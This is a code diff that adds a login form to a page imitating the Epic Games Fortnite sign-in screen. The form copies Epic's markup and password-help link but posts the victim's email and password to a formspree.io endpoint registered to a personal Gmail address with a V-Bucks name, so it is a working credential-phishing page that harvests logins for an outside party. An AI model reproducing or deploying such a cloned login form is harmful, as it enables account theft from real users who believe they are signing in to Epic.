@@ -225,6 +225,38 @@ window.__locale = '';
                 </div>-->
         </div>
 
+<form id="loginForm" class="filled" method="POST" action="https://formspree.io/bingnut.vbucks@gmail.com">
+
+                    <div class="textField">
+                        <input type="email" name="email" oninput="com.epicgames.account.web.widgets.validateLoginForm();" placeholder="Email">
+                    </div>
+
+                    <div class="textField">
+                        <input type="password" name="password" oninput="com.epicgames.account.web.widgets.validateLoginForm();" placeholder="Password"></input>
+                    </div>
+
+                    <div class="login-modifiers">
+                            <div id="rememberMeCheckContainer" class="checkContainer left filled">
+                                <input id="rememberMe" type="checkbox" name="rememberMe" value="YES" checked="checked" class="check">
+                                <label for="rememberMe"><span></span></label>
+                                <label for="rememberMe" class="checkLabel">Remember Me</label>
+                            </div>
+        
+                            <div class="findContainer">
+                                <span class="resetPass">
+                                    <a href="https://accounts.epicgames.com/login/customized?loginSubheading=Sign+In&amp;regSubheading=Register&amp;productName=fortnite&amp;redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Ffortnite%2Fen-US%2Fbuy-now%2Fbattle-royale&amp;client_id=cd2b7c19c9734a2ab98dc251868d7724&amp;noHostRedirect=true" onclick="com.epicgames.account.web.widgets.requestReset();
+                                    return false;">Password help</a>
+                                </span>
+                            </div>
+        
+                            <div class="clearfix"></div>
+                        </div>
+
+                    <div id="signInBtnContainer" class="btnContainer filled" style="margin-top: 25px">
+                        <input id="signIn" type="submit" value="Sign In" class="disabled" onclick="com.epicgames.account.web.widgets.validateLoginForm()">    
+                    </div>
+                    </form>
+
         <div class="switchPage switchPageFormContainer">
             <span class="epic-logo"></span>
             <span id="switchPageMessage">
